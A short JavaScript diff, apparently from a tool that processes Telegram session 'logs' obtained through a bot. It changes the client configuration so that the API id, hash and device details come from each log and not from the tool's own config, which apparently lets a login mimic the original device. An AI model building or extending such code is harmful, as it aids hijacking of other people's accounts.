@@ -69,11 +69,11 @@ ${log.bot.includes(':') ? `ℹ️ Добытый с бота @${(await new Teleg
                         checkSpam: true,
                         telegramClient:
                         {
-                            "telegram_api_id": config.apiId,
-                            "telegram_api_hash": config.apiHash,
-                            "telegram_device_model": log.deviceParams.deviceModel,
-                            "telegram_system_version": log.deviceParams.systemVersion,
-                            "telegram_app_version": log.deviceParams.appVersion
+                            "telegram_api_id": log.deviceParams.app_id,
+                            "telegram_api_hash": log.deviceParams.app_hash,
+                            "telegram_device_model": log.deviceParams.device,
+                            "telegram_system_version": log.deviceParams.sdk,
+                            "telegram_app_version": log.deviceParams.app_version
                         }
                         ,
                         checkChannels: true
